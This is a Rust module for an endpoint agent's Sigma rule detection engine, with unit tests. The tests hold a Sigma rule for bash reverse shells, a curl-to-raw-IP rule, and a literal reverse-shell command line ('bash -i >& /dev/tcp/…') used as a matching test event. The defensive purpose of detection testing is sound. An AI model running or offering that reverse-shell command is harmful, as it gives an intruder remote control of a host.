//! Local Sigma detection engine.
//!
//! Translates Sigma rules (the community/industry-standard detection format)
//! into the agent's in-process detection layer, so operators and the backend
//! can ship new detections **without recompiling the agent**. Rules come from
//! two sources, both merged on every (re)load:
//!
//!   * **Disk** — `*.yml` / `*.yaml` under `<config>/sigma/` (operator-managed,
//!     boot-time baseline).
//!   * **Backend** — inline YAML documents delivered over the signed, monotonic
//!     config channel (`AgentConfig.sigma_rules`), recompiled on each config
//!     application.
//!
//! A compiled rule is matched against an event by projecting the event into a
//! Sigma field map ([`fields::FieldView`]), evaluating each named search and
//! finally the `condition` expression. Matching never blocks the consumer and
//! never allocates beyond the (small) per-event result map.

mod condition;
pub mod fields;
mod model;

use std::path::Path;

use tracing::{info, warn};

pub use model::CompiledRule;

use fields::FieldView;

/// A compiled set of Sigma rules ready to evaluate events.
#[derive(Default)]
pub struct SigmaEngine {
    rules: Vec<CompiledRule>,
}

impl SigmaEngine {
    pub fn empty() -> Self {
        Self { rules: Vec::new() }
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// Compile rules from every `*.yml`/`*.yaml` file under `dir`. Missing dir
    /// is not an error (returns empty). Individual bad rules are logged and
    /// skipped so one malformed file cannot disable the whole engine.
    pub fn from_dir(dir: &Path) -> Self {
        let mut engine = Self::empty();
        let rd = match std::fs::read_dir(dir) {
            Ok(rd) => rd,
            Err(_) => return engine,
        };
        for entry in rd.flatten() {
            let path = entry.path();
            let is_yaml = path
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"))
                .unwrap_or(false);
            if !is_yaml {
                continue;
            }
            match std::fs::read_to_string(&path) {
                Ok(text) => {
                    let (n, errs) = engine.add_yaml_documents(&text);
                    if n > 0 {
                        info!(file = %path.display(), rules = n, "Sigma rules loaded");
                    }
                    for e in errs {
                        warn!(file = %path.display(), error = %e, "skipping invalid Sigma rule");
                    }
                }
                Err(e) => warn!(file = %path.display(), error = %e, "cannot read Sigma file"),
            }
        }
        engine
    }

    /// Compile a list of inline YAML rule documents (backend-delivered).
    /// Returns the engine plus a list of human-readable compile errors.
    pub fn from_yaml_docs(docs: &[String]) -> (Self, Vec<String>) {
        let mut engine = Self::empty();
        let mut errors = Vec::new();
        for doc in docs {
            let (_, errs) = engine.add_yaml_documents(doc);
            errors.extend(errs);
        }
        (engine, errors)
    }

    /// Append all YAML documents (`---`-separated) found in `text`. Returns the
    /// count added and any per-document errors.
    fn add_yaml_documents(&mut self, text: &str) -> (usize, Vec<String>) {
        let mut added = 0;
        let mut errors = Vec::new();
        for de in serde_yaml_ng::Deserializer::from_str(text) {
            let raw: Result<model::RawRule, _> = serde::Deserialize::deserialize(de);
            match raw
                .map_err(anyhow::Error::from)
                .and_then(model::CompiledRule::compile)
            {
                Ok(rule) => {
                    self.rules.push(rule);
                    added += 1;
                }
                Err(e) => errors.push(format!("{e:#}")),
            }
        }
        (added, errors)
    }

    /// Merge another engine's rules into this one.
    pub fn extend(&mut self, other: SigmaEngine) {
        self.rules.extend(other.rules);
    }

    /// Evaluate all rules against an event projection, returning every matched
    /// rule. Rules whose `logsource` category/product does not match the event
    /// are skipped cheaply.
    pub fn evaluate<'a>(&'a self, view: &FieldView) -> Vec<&'a CompiledRule> {
        let mut hits = Vec::new();
        for rule in &self.rules {
            if let Some(cat) = &rule.category {
                if cat != view.category {
                    continue;
                }
            }
            if let Some(prod) = &rule.product {
                if prod != view.product {
                    continue;
                }
            }
            let results: std::collections::BTreeMap<String, bool> = rule
                .searches
                .iter()
                .map(|(name, search)| (name.clone(), search.matches(view)))
                .collect();
            if rule.condition.eval(&results) {
                hits.push(rule);
            }
        }
        hits
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::{
        AgentEvent, EventAction, EventClass, EventData, ExecEventData, NetworkConnectionData,
        Severity,
    };

    fn exec_event(exe: &str, cmd: &str) -> AgentEvent {
        let data = ExecEventData {
            pid: 100,
            ppid: 1,
            uid: 0,
            gid: 0,
            username: "root".into(),
            comm: "bash".into(),
            exe: exe.into(),
            cmdline: cmd.into(),
            cwd: "/root".into(),
            container_id: None,
            ld_preload: None,
            exe_sha256: None,
            loaded_libraries: vec![],
            env: Default::default(),
            interpreter: None,
            container_runtime: None,
            container_image: None,
            container_image_digest: None,
            k8s: None,
        };
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(Box::new(data)),
        )
    }

    const REV_SHELL_RULE: &str = r#"
title: Bash Reverse Shell
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/bash'
    CommandLine|contains: '/dev/tcp/'
  condition: selection
tags:
  - attack.t1059.004
"#;

    #[test]
    fn matches_reverse_shell_and_respects_logsource() {
        let (engine, errs) = SigmaEngine::from_yaml_docs(&[REV_SHELL_RULE.to_string()]);
        assert!(errs.is_empty(), "compile errors: {errs:?}");
        assert_eq!(engine.len(), 1);

        let hit = exec_event("/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        let view = FieldView::from_event(&hit).unwrap();
        let m = engine.evaluate(&view);
        assert_eq!(m.len(), 1);
        assert_eq!(m[0].mitre_technique.as_deref(), Some("T1059.004"));

        // Benign bash invocation → no hit.
        let benign = exec_event("/usr/bin/bash", "bash -lc 'ls -la'");
        let view = FieldView::from_event(&benign).unwrap();
        assert!(engine.evaluate(&view).is_empty());
    }

    #[test]
    fn logsource_category_gates_evaluation() {
        let (engine, _) = SigmaEngine::from_yaml_docs(&[REV_SHELL_RULE.to_string()]);
        // A network event must never be judged by a process_creation rule.
        let net = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::NetworkConnection(NetworkConnectionData {
                protocol: "tcp".into(),
                src_addr: "10.0.0.1".into(),
                src_port: 1,
                dst_addr: "10.0.0.2".into(),
                dst_port: 443,
                state: "established".into(),
                pid: None,
                process: None,
                duration_ms: None,
                bytes_sent: None,
                bytes_recv: None,
                packets_sent: None,
                packets_recv: None,
                rtt_us: None,
            }),
        );
        let view = FieldView::from_event(&net).unwrap();
        assert!(engine.evaluate(&view).is_empty());
    }

    #[test]
    fn condition_and_not_filter() {
        let rule = r#"
title: Curl To Raw IP But Not Localhost
level: medium
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: '/curl'
  filter:
    CommandLine|contains: '127.0.0.1'
  condition: selection and not filter
"#;
        let (engine, errs) = SigmaEngine::from_yaml_docs(&[rule.to_string()]);
        assert!(errs.is_empty(), "{errs:?}");

        let hit = exec_event("/usr/bin/curl", "curl http://203.0.113.9/x");
        let view = FieldView::from_event(&hit).unwrap();
        assert_eq!(engine.evaluate(&view).len(), 1);

        let filtered = exec_event("/usr/bin/curl", "curl http://127.0.0.1/x");
        let view = FieldView::from_event(&filtered).unwrap();
        assert!(engine.evaluate(&view).is_empty());
    }

    #[test]
    fn bad_rule_is_skipped_not_fatal() {
        let docs = vec![
            "title: broken\nlogsource: {}\ndetection: {}\n".to_string(),
            REV_SHELL_RULE.to_string(),
        ];
        let (engine, errs) = SigmaEngine::from_yaml_docs(&docs);
        assert_eq!(engine.len(), 1, "the good rule still loads");
        assert!(!errs.is_empty(), "the broken rule is reported");
    }
}
